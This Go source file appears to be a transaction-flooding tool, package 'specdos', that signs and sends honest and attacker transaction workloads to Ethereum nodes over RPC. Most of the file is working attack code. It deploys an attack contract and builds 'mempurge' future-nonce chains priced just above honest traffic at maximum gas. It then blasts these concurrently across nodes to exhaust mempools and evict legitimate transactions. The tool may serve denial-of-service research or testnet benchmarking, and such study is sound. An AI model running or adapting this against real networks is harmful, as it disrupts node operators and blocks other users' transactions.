package specdos

import (
	"context"
	"crypto/ecdsa"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/ethclient"
)

type AttackMode string

const (
	ModeHonest      AttackMode = "honest"
	ModeConditional AttackMode = "conditional"
	ModeCombined    AttackMode = "combined"
)

type Workload struct {
	HonestTxs   types.Transactions
	AttackerTxs types.Transactions
	Contract    common.Address
}

type TxgenConfig struct {
	Mode                  AttackMode
	Contract              common.Address
	DeployContract        bool
	HonestRecords         []KeyRecord
	AttackerRecords       []KeyRecord
	HonestTxsPerAccount   uint64
	AttackerTxsPerAccount uint64
	MemPurgeLen           uint64
}

type SendConfig struct {
	HonestRatePerSecond   int
	AttackerRatePerSecond int
	HonestChunkSize       int
	AttackerChunkSize     int
	Fanout                bool
	IgnoreNonceTooLow     bool
}

type SendStats struct {
	Attempted int
	Sent      int
	Known     int
	Failed    int
	Started   time.Time
	Finished  time.Time
}

func (stats SendStats) Duration() time.Duration {
	if stats.Started.IsZero() || stats.Finished.IsZero() {
		return 0
	}
	return stats.Finished.Sub(stats.Started)
}

func BuildWorkload(ctx context.Context, client *ethclient.Client, cfg TxgenConfig) (*Workload, error) {
	honestKeys, honestAddrs, err := PrivateKeys(cfg.HonestRecords)
	if err != nil {
		return nil, err
	}
	attackerKeys, attackerAddrs, err := PrivateKeys(cfg.AttackerRecords)
	if err != nil {
		return nil, err
	}
	chainID, err := client.ChainID(ctx)
	if err != nil {
		return nil, fmt.Errorf("chain id: %w", err)
	}
	signer := types.LatestSignerForChainID(chainID)
	header, err := client.HeaderByNumber(ctx, nil)
	if err != nil {
		return nil, fmt.Errorf("latest header: %w", err)
	}
	baseFee := header.BaseFee
	if baseFee == nil {
		baseFee = big.NewInt(50000000)
	}
	if header.GasLimit <= 21000+8295 {
		return nil, fmt.Errorf("latest block gas limit %d is too low for attack transaction gas", header.GasLimit)
	}
	gasLimit := header.GasLimit - 21000 - 8295

	contract := cfg.Contract
	if cfg.Mode != ModeHonest && contract == (common.Address{}) {
		if !cfg.DeployContract {
			return nil, fmt.Errorf("attack mode requires --contract or --deploy")
		}
		if len(attackerKeys) == 0 {
			return nil, fmt.Errorf("attack mode requires at least one attacker key")
		}
		code, _ := attackCodeData(cfg.Mode)
		contract, err = DeployAttackContract(ctx, client, signer, attackerKeys[0], attackerAddrs[0], gasLimit, baseFee, code)
		if err != nil {
			return nil, err
		}
	}

	honestTxNum := cfg.HonestTxsPerAccount
	if honestTxNum == 0 {
		honestTxNum = 1
	}
	attackerTxNum := cfg.AttackerTxsPerAccount
	if attackerTxNum == 0 {
		attackerTxNum = 1
	}

	honestFee := new(big.Int).Mul(baseFee, big.NewInt(500))
	honestTo := common.Address{}
	if len(honestAddrs) > 0 {
		honestTo = honestAddrs[0]
	}
	honestTxs, err := CreateTxsRPC(ctx, client, signer, honestAddrs, honestKeys, honestTxNum, &honestTo, big.NewInt(1), 21000, honestFee, honestFee, nil)
	if err != nil {
		return nil, err
	}

	var attackerTxs types.Transactions
	if cfg.Mode != ModeHonest {
		if len(attackerAddrs) == 0 {
			return nil, fmt.Errorf("attack mode requires at least one attacker key")
		}
		_, data := attackCodeData(cfg.Mode)
		attackerFee := new(big.Int).Add(honestFee, big.NewInt(1))
		if cfg.MemPurgeLen > 0 {
			attackerTxs, err = CreateMemPurgeTxsRPC(ctx, client, signer, attackerAddrs, attackerKeys, cfg.MemPurgeLen, &contract, big.NewInt(1), gasLimit, attackerFee, attackerFee, data)
		} else {
			attackerTxs, err = CreateTxsRPC(ctx, client, signer, attackerAddrs, attackerKeys, attackerTxNum, &contract, big.NewInt(1), gasLimit, attackerFee, attackerFee, data)
		}
		if err != nil {
			return nil, err
		}
	}
	return &Workload{
		HonestTxs:   honestTxs,
		AttackerTxs: attackerTxs,
		Contract:    contract,
	}, nil
}

func DeployAttackContract(ctx context.Context, client *ethclient.Client, signer types.Signer, key *ecdsa.PrivateKey, addr common.Address, gas uint64, baseFee *big.Int, code []byte) (common.Address, error) {
	nonce, err := client.PendingNonceAt(ctx, addr)
	if err != nil {
		return common.Address{}, fmt.Errorf("contract nonce: %w", err)
	}
	fee := new(big.Int).Mul(baseFee, big.NewInt(50))
	tx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
		Nonce:     nonce,
		To:        nil,
		Value:     new(big.Int),
		Gas:       gas,
		GasFeeCap: fee,
		GasTipCap: fee,
		Data:      code,
	}), signer, key)
	if err != nil {
		return common.Address{}, err
	}
	if err := client.SendTransaction(ctx, tx); err != nil {
		return common.Address{}, fmt.Errorf("send contract deployment: %w", err)
	}
	receipt, err := waitReceipt(ctx, client, tx.Hash(), 3*time.Minute)
	if err != nil {
		return common.Address{}, err
	}
	if receipt.ContractAddress == (common.Address{}) {
		return common.Address{}, fmt.Errorf("deployment receipt has no contract address")
	}
	return receipt.ContractAddress, nil
}

func CreateTxsRPC(ctx context.Context, client *ethclient.Client, signer types.Signer, addrs []common.Address, keys []*ecdsa.PrivateKey, txNum uint64, to *common.Address, value *big.Int, gas uint64, gasFee *big.Int, gasTip *big.Int, data []byte) (types.Transactions, error) {
	txs := make(types.Transactions, 0, len(addrs)*int(txNum))
	for i, addr := range addrs {
		nonce, err := client.PendingNonceAt(ctx, addr)
		if err != nil {
			return nil, fmt.Errorf("nonce %s: %w", addr.Hex(), err)
		}
		for curNum := uint64(0); curNum < txNum; curNum++ {
			tx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
				Nonce:     nonce + curNum,
				To:        to,
				Value:     value,
				Gas:       gas,
				GasFeeCap: gasFee,
				GasTipCap: gasTip,
				Data:      data,
			}), signer, keys[i])
			if err != nil {
				return nil, err
			}
			txs = append(txs, tx)
		}
	}
	return txs, nil
}

func CreateMemPurgeTxsRPC(ctx context.Context, client *ethclient.Client, signer types.Signer, addrs []common.Address, keys []*ecdsa.PrivateKey, chainLen uint64, to *common.Address, value *big.Int, gas uint64, gasFee *big.Int, gasTip *big.Int, data []byte) (types.Transactions, error) {
	txs := types.Transactions{}
	for i, addr := range addrs {
		firstNonce, err := client.PendingNonceAt(ctx, addr)
		if err != nil {
			return nil, fmt.Errorf("nonce %s: %w", addr.Hex(), err)
		}
		for nonceAdd := uint64(1); nonceAdd < chainLen; nonceAdd++ {
			tx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
				Nonce:     firstNonce + nonceAdd,
				To:        to,
				Value:     value,
				Gas:       gas,
				GasFeeCap: gasFee,
				GasTipCap: gasTip,
				Data:      data,
			}), signer, keys[i])
			if err != nil {
				return nil, err
			}
			txs = append(txs, tx)
		}

		probe, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     firstNonce,
			To:        to,
			Value:     big.NewInt(0),
			Gas:       gas,
			GasFeeCap: gasFee,
			GasTipCap: gasTip,
			Data:      data,
		}), signer, keys[i])
		if err != nil {
			return nil, err
		}
		balance, err := client.BalanceAt(ctx, addr, nil)
		if err != nil {
			return nil, fmt.Errorf("balance %s: %w", addr.Hex(), err)
		}
		remaining := new(big.Int).Sub(balance, probe.Cost())
		if remaining.Sign() < 0 {
			return nil, fmt.Errorf("account %s balance is lower than first mempurge transaction cost", addr.Hex())
		}
		tx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
			Nonce:     firstNonce,
			To:        to,
			Value:     remaining,
			Gas:       gas,
			GasFeeCap: gasFee,
			GasTipCap: gasTip,
			Data:      data,
		}), signer, keys[i])
		if err != nil {
			return nil, err
		}
		txs = append(txs, tx)
	}
	return txs, nil
}

func SaveContractAddress(path string, addr common.Address) error {
	if path == "" {
		return nil
	}
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return err
	}
	return os.WriteFile(path, []byte(addr.Hex()+"\n"), 0644)
}

func SendWorkload(ctx context.Context, clients []*ethclient.Client, workload *Workload, cfg SendConfig) (SendStats, error) {
	type result struct {
		stats SendStats
		err   error
	}
	results := make(chan result, 2)
	started := time.Now()
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		stats, err := SendTxsConcurrently(ctx, clients, workload.HonestTxs, cfg.HonestRatePerSecond, cfg.HonestChunkSize, cfg.Fanout, cfg.IgnoreNonceTooLow)
		results <- result{stats: stats, err: err}
	}()
	go func() {
		defer wg.Done()
		stats, err := SendTxsConcurrently(ctx, clients, workload.AttackerTxs, cfg.AttackerRatePerSecond, cfg.AttackerChunkSize, cfg.Fanout, cfg.IgnoreNonceTooLow)
		results <- result{stats: stats, err: err}
	}()
	wg.Wait()
	close(results)

	stats := SendStats{Started: started, Finished: time.Now()}
	var firstErr error
	for result := range results {
		stats.Attempted += result.stats.Attempted
		stats.Sent += result.stats.Sent
		stats.Known += result.stats.Known
		stats.Failed += result.stats.Failed
		if firstErr == nil && result.err != nil {
			firstErr = result.err
		}
	}
	return stats, firstErr
}

func SendTxsConcurrently(ctx context.Context, clients []*ethclient.Client, txs types.Transactions, ratePerSecond int, chunkSize int, fanout bool, ignoreNonceTooLow bool) (stats SendStats, err error) {
	stats = SendStats{Started: time.Now()}
	defer func() {
		stats.Finished = time.Now()
	}()
	if len(txs) == 0 {
		return stats, nil
	}
	if len(clients) == 0 {
		return stats, fmt.Errorf("no RPC clients configured")
	}
	if ratePerSecond <= 0 {
		ratePerSecond = 1
	}
	if chunkSize <= 0 {
		chunkSize = 1
	}
	sleepTime := time.Second / time.Duration(ratePerSecond)
	if sleepTime <= 0 {
		sleepTime = time.Millisecond
	}
	for i := 0; i < len(txs); i += chunkSize {
		end := i + chunkSize
		if end > len(txs) {
			end = len(txs)
		}
		chunkStats, err := sendChunk(ctx, clients, txs[i:end], i, fanout, ignoreNonceTooLow)
		stats.Attempted += chunkStats.Attempted
		stats.Sent += chunkStats.Sent
		stats.Known += chunkStats.Known
		stats.Failed += chunkStats.Failed
		if err != nil {
			return stats, err
		}
		select {
		case <-ctx.Done():
			return stats, ctx.Err()
		case <-time.After(sleepTime):
		}
	}
	return stats, nil
}

func sendChunk(ctx context.Context, clients []*ethclient.Client, txs types.Transactions, offset int, fanout bool, ignoreNonceTooLow bool) (SendStats, error) {
	stats := SendStats{Started: time.Now()}
	var wg sync.WaitGroup
	var mu sync.Mutex
	var firstErr error
	record := func(err error) {
		mu.Lock()
		defer mu.Unlock()
		stats.Attempted++
		switch {
		case err == nil:
			stats.Sent++
		case isKnownTxError(err, ignoreNonceTooLow):
			stats.Known++
		default:
			stats.Failed++
			if firstErr == nil {
				firstErr = err
			}
		}
	}
	send := func(client *ethclient.Client, tx *types.Transaction) {
		defer wg.Done()
		if err := ctx.Err(); err != nil {
			record(err)
			return
		}
		record(client.SendTransaction(ctx, tx))
	}
	for j, tx := range txs {
		tx := tx
		if fanout {
			for _, client := range clients {
				client := client
				wg.Add(1)
				go send(client, tx)
			}
			continue
		}
		client := clients[(offset+j)%len(clients)]
		wg.Add(1)
		go send(client, tx)
	}
	wg.Wait()
	stats.Finished = time.Now()
	return stats, firstErr
}

func attackCodeData(mode AttackMode) ([]byte, []byte) {
	switch mode {
	case ModeCombined:
		return CombinedAttackCode, CombinedAttackData
	default:
		return ConditionalExhaustCode, ConditionalExhaustData
	}
}

func waitReceipt(ctx context.Context, client *ethclient.Client, hash common.Hash, timeout time.Duration) (*types.Receipt, error) {
	deadline := time.NewTimer(timeout)
	defer deadline.Stop()
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	for {
		receipt, err := client.TransactionReceipt(ctx, hash)
		if err == nil {
			return receipt, nil
		}
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-deadline.C:
			return nil, fmt.Errorf("timed out waiting for receipt %s", hash.Hex())
		case <-ticker.C:
		}
	}
}

func isKnownTxError(err error, ignoreNonceTooLow bool) bool {
	msg := strings.ToLower(err.Error())
	known := []string{
		"already known",
		"already imported",
		"known transaction",
		"replacement transaction underpriced",
		"transaction underpriced",
	}
	if ignoreNonceTooLow {
		known = append(known, "nonce too low")
	}
	for _, item := range known {
		if strings.Contains(msg, item) {
			return true
		}
	}
	return false
}
